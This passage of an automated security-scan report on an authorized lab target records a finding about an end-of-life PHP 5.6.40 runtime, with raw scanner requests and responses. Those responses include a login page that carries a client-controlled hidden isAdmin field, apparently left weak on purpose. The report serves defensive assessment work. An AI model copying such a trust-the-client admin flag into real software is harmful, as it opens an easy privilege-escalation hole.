+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL /index.php9bvmr2f3sr was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.25 (Debian) Server at target.local Port 32836&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqynt6hp-1d</code> — <code>artifacts/_/ev-mqynt6hp-1d/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-encoding: gzip
+content-length: 1164
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 03:29:53 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.25 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/5.6.40
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;AUTH 01&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
+            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
+            background-size: cover; /* Cover the entire background */
+            background-repeat: no-repeat; /* Do not repeat the background */
+            font-family: 'Arial', sans-serif; /* Clean, simple font */
+            text-align: center; /* Centering text */
+            height: 100vh; /* Full height of the viewport */
+            display: flex; /* Enables flexbox */
+            flex-direction: column; /* Stack children vertically */
+            justify-content: center; /* Center vertically */
+            align-items: center; /* Center horizontally */
+            margin: 0; /* Remove default margin */
+            padding: 0; /* Remove default padding */
+        }
+        h1, h2, h3 {
+            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
+            color: #FFFFFF; /* White text color */
+        }
+        img {
+            max-width: 80%; /* Ensure image does not exceed the width of the screen */
+            height: auto; /* Maintain aspect ratio */
+        }
+        form {
+            margin-top: 20px; /* Add space above the form */
+            background-color: #FFFFFF; /* White background for the form */
+            padding: 20px; /* Padding inside the form */
+            border-radius: 10px; /* Rounded corners for the form */
+            display: inline-block; /* Center the form on the page */
+            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
+        }
+        input[type=&quot;text&quot;], input[type=&quot;password&quot;] {
+            margin: 10px 0; /* Margin for top and bottom */
+            padding: 10px; /* Padding inside the input fields */
+            width: 200px; /* Set width for input fields */
+            border: 1px solid #ddd; /* Subtle border style */
+            border-radius: 5px; /* Rounded corners for the input fields */
+        }
+        button {
+            background-color: #6495ED; /* Cornflower blue background for the button */
+            color: #FFFFFF; /* White text color */
+            padding: 10px 20px; /* Padding inside the button */
+            border: none; /* No border for the button */
+            border-radius: 5px; /* Rounded corners for the button */
+            cursor: pointer; /* Pointer cursor on hover */
+            font-size: 16px; /* Larger text for the button */
+        }
+        button:hover {
+            background-color: #4169E1; /* Slightly darker blue on hover */
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to Springfield!&lt;/h1&gt;
+    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+        Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;
+        Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;isAdmin&quot; value=&quot;false&quot; /&gt;
+        &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+    &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqynt81c-1e</code> — <code>artifacts/_/ev-mqynt81c-1e/</code></div><div class="lbl">REQUEST</div><pre>GET /index.phpUmbr4Refl3ctK9z HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 305
+content-type: text/html; charset=iso-8859-1
+date: Mon, 29 Jun 2026 03:29:55 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.25 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL /index.phpUmbr4Refl3ctK9z was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.25 (Debian) Server at target.local Port 32836&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqynt9l0-1f</code> — <code>artifacts/_/ev-mqynt9l0-1f/</code></div><div class="lbl">REQUEST</div><pre>GET /index.phpUmbr4Refl3ctK9z HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 305
+content-type: text/html; charset=iso-8859-1
+date: Mon, 29 Jun 2026 03:29:57 GMT
+keep-alive: timeout=5, max=98
+server: Apache/2.4.25 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL /index.phpUmbr4Refl3ctK9z was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.25 (Debian) Server at target.local Port 32836&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 4. [vulnerable-component] End-of-Life PHP 5.6.40 — unsupported runtime, no security patches since 2018</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32836/</div>
+<div class="desc">VERSION-BASED finding (matched by the `X-Powered-By: PHP/5.6.40` response header, NOT exploited). PHP 5.6 reached END-OF-LIFE on 2018-12-31, and 5.6.40 (released 2019-01-10) is the FINAL release of the 5.6 branch — it receives NO security updates of any kind. Any vulnerability in the 5.6 codebase disclosed after that date is permanently unpatched, e.g. CVE-2019-11041 / CVE-2019-11042 (heap buffer over-read in the EXIF extension, info-disclosure/DoS — fixed only in maintained 7.x) and subsequent core/extension issues. Beyond specific CVEs, running an EOL language runtime that is also exposed via the banner is a standing A06 risk: the operator gains no patches and the version is freely advertised to attackers. Severity MEDIUM: known post-EOL issues are memory-safety (info-leak/DoS) rather than confirmed remote RCE on this build, but the unsupported-runtime exposure is real and ongoing. Remediation: migrate to a supported PHP release (8.x) and at minimum suppress the X-Powered-By banner (expose_php = Off). NOT actively confirmed beyond the banner.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32836/ → `X-Powered-By: PHP/5.6.40` (200, 3169 bytes) [ev-mqynql25-19].
+2. GET http://target.local:32836/index.php → same X-Powered-By: PHP/5.6.40, stable (200, 3169 bytes) [ev-mqynqm3x-1a].
+3. Negative control: GET /verdict-nonexistent-banner-control-404 → 404 (318 bytes), distinguishable status/length [ev-mqynqmrd-1b].
+4. PHP 5.6 EOL 2018-12-31; 5.6.40 is the last release → confirm no security backports are applied and upgrade.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqynqmrd-1b</code> — <code>artifacts/_/ev-mqynqmrd-1b/</code></div><div class="lbl">REQUEST</div><pre>GET /verdict-nonexistent-banner-control-404 HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 318
+content-type: text/html; charset=iso-8859-1
+date: Mon, 29 Jun 2026 03:27:54 GMT
+keep-alive: timeout=5, max=98
+server: Apache/2.4.25 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL /verdict-nonexistent-banner-control-404 was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.25 (Debian) Server at target.local Port 32836&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqynql25-19</code> — <code>artifacts/_/ev-mqynql25-19/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 3169
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 03:27:52 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.25 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/5.6.40
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;AUTH 01&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
+            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
+            background-size: cover; /* Cover the entire background */
+            background-repeat: no-repeat; /* Do not repeat the background */
+            font-family: 'Arial', sans-serif; /* Clean, simple font */
+            text-align: center; /* Centering text */
+            height: 100vh; /* Full height of the viewport */
+            display: flex; /* Enables flexbox */
+            flex-direction: column; /* Stack children vertically */
+            justify-content: center; /* Center vertically */
+            align-items: center; /* Center horizontally */
+            margin: 0; /* Remove default margin */
+            padding: 0; /* Remove default padding */
+        }
+        h1, h2, h3 {
+            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
+            color: #FFFFFF; /* White text color */
+        }
+        img {
+            max-width: 80%; /* Ensure image does not exceed the width of the screen */
+            height: auto; /* Maintain aspect ratio */
+        }
+        form {
+            margin-top: 20px; /* Add space above the form */
+            background-color: #FFFFFF; /* White background for the form */
+            padding: 20px; /* Padding inside the form */
+            border-radius: 10px; /* Rounded corners for the form */
+            display: inline-block; /* Center the form on the page */
+            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
+        }
+        input[type=&quot;text&quot;], input[type=&quot;password&quot;] {
+            margin: 10px 0; /* Margin for top and bottom */
+            padding: 10px; /* Padding inside the input fields */
+            width: 200px; /* Set width for input fields */
+            border: 1px solid #ddd; /* Subtle border style */
+            border-radius: 5px; /* Rounded corners for the input fields */
+        }
+        button {
+            background-color: #6495ED; /* Cornflower blue background for the button */
+            color: #FFFFFF; /* White text color */
+            padding: 10px 20px; /* Padding inside the button */
+            border: none; /* No border for the button */
+            border-radius: 5px; /* Rounded corners for the button */
+            cursor: pointer; /* Pointer cursor on hover */
+            font-size: 16px; /* Larger text for the button */
+        }
+        button:hover {
+            background-color: #4169E1; /* Slightly darker blue on hover */
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to Springfield!&lt;/h1&gt;
+    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+        Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;
+        Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;isAdmin&quot; value=&quot;false&quot; /&gt;
+        &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+    &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqynqm3x-1a</code> — <code>artifacts/_/ev-mqynqm3x-1a/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 3169
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 03:27:53 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.25 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/5.6.40
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;AUTH 01&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
+            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
+            background-size: cover; /* Cover the entire background */
+            background-repeat: no-repeat; /* Do not repeat the background */
+            font-family: 'Arial', sans-serif; /* Clean, simple font */
+            text-align: center; /* Centering text */
+            height: 100vh; /* Full height of the viewport */
+            display: flex; /* Enables flexbox */
+            flex-direction: column; /* Stack children vertically */
+            justify-content: center; /* Center vertically */
+            align-items: center; /* Center horizontally */
+            margin: 0; /* Remove default margin */
+            padding: 0; /* Remove default padding */
+        }
+        h1, h2, h3 {
+            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
+            color: #FFFFFF; /* White text color */
+        }
+        img {
+            max-width: 80%; /* Ensure image does not exceed the width of the screen */
+            height: auto; /* Maintain aspect ratio */
+        }
+        form {
+            margin-top: 20px; /* Add space above the form */
+            background-color: #FFFFFF; /* White background for the form */
+            padding: 20px; /* Padding inside the form */
+            border-radius: 10px; /* Rounded corners for the form */
+            display: inline-block; /* Center the form on the page */
+            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
+        }
+        input[type=&quot;text&quot;], input[type=&quot;password&quot;] {
+            margin: 10px 0; /* Margin for top and bottom */
+            padding: 10px; /* Padding inside the input fields */
+            width: 200px; /* Set width for input fields */
+            border: 1px solid #ddd; /* Subtle border style */
+            border-radius: 5px; /* Rounded corners for the input fields */
+        }
+        button {
+            background-color: #6495ED; /* Cornflower blue background for the button */
+            color: #FFFFFF; /* White text color */
+            padding: 10px 20px; /* Padding inside the button */
+            border: none; /* No border for the button */
+            border-radius: 5px; /* Rounded corners for the button */
+            cursor: pointer; /* Pointer cursor on hover */
+            font-size: 16px; /* Larger text for the button */
+        }
+        button:hover {
+            background-color: #4169E1; /* Slightly darker blue on hover */
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to Springfield!&lt;/h1&gt;
+    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+        Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;
+        Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;isAdmin&quot; value=&quot;false&quot; /&gt;
+        &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+    &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
